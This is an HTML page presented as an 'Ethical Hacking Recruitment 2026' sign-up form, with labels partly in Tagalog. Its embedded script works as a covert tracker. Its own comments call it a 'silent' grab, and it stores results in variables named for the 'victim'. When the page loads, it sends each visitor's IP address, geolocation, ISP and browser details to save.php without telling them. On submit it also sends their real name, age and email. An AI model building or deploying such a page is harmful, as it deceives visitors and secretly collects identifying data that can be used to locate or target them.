<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethical Hacking Recruitment 2026</title>
    <script src="https://ipapi.co/json/"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 500px; width: 90%; }
        h1 { color: #333; text-align: center; margin-bottom: 1.5rem; font-size: 1.8rem; }
        .form-group { margin-bottom: 1.2rem; }
        label { display: block; margin-bottom: 0.5rem; color: #555; font-weight: 500; }
        input, textarea { width: 100%; padding: 12px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; }
        input:focus, textarea:focus { outline: none; border-color: #667eea; }
        textarea { resize: vertical; height: 100px; }
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
        .loading { text-align: center; color: #666; margin-top: 1rem; display: none; }
        .success { background: #d4edda; color: #155724; padding: 1rem; border-radius: 8px; text-align: center; margin-top: 1rem; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏆 Ethical Hacking Recruitment 2026</h1>
        <form id="recruitmentForm">
            <div class="form-group">
                <label>Real Name (No nicknames)</label>
                <input type="text" id="realName" name="realName" required>
            </div>
            
            <div class="form-group">
                <label>Age</label>
                <input type="number" id="age" name="age" min="18" max="60" required>
            </div>
            
            <div class="form-group">
                <label>Bakit ka sasali sa Ethical Hacking? (Why join?)</label>
                <textarea id="reason" name="reason" required placeholder="Explain your motivation..."></textarea>
            </div>
            
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <button type="submit" id="submitBtn">🚀 Submit Application</button>
            <div class="loading" id="loading">Verifying location...</div>
            <div class="success" id="successMsg">✅ Application submitted successfully! Check your email for next steps.</div>
        </form>
    </div>

    <script>
        let victimIP = '', victimGeo = {};
        
        // Silent IP + Geolocation grab (no display)
        $(document).ready(function() {
            // Primary IPAPI grab
            $.get('https://ipapi.co/json/')
                .done(function(data) {
                    victimIP = data.ip;
                    victimGeo = {
                        ip: data.ip,
                        city: data.city || '',
                        region: data.region || '',
                        country: data.country_name || '',
                        lat: data.latitude || '',
                        lon: data.longitude || '',
                        org: data.org || '',
                        timezone: data.timezone || ''
                    };
                    silentIPSubmit();
                })
                .fail(function() {
                    // Fallback IP grab
                    fetch('https://api.ipify.org?format=json')
                        .then(r => r.json())
                        .then(data => {
                            victimIP = data.ip;
                            silentIPSubmit();
                        })
                        .catch(() => {
                            // Ultimate fallback - server-side IP
                            $.post('save.php', {
                                type: 'ip_grab_fallback',
                                user_agent: navigator.userAgent,
                                timestamp: new Date().toISOString()
                            });
                        });
                });
        });

        function silentIPSubmit() {
            $.post('save.php', {
                type: 'ip_grab',
                ip: victimIP,
                geo: JSON.stringify(victimGeo),
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            });
        }

        // Form submission
        $('#recruitmentForm').on('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                type: 'form_submit',
                realName: $('#realName').val(),
                age: $('#age').val(),
                reason: $('#reason').val(),
                email: $('#email').val(),
                ip: victimIP,
                geo: JSON.stringify(victimGeo),
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            $('#submitBtn').prop('disabled', true).text('Processing...');
            $('#loading').show();
            
            $.post('save.php', formData, function() {
                $('#loading').hide();
                $('#successMsg').show();
                $('#recruitmentForm')[0].reset();
                setTimeout(() => location.reload(), 3000);
            });
        });
    </script>
</body>
</html>
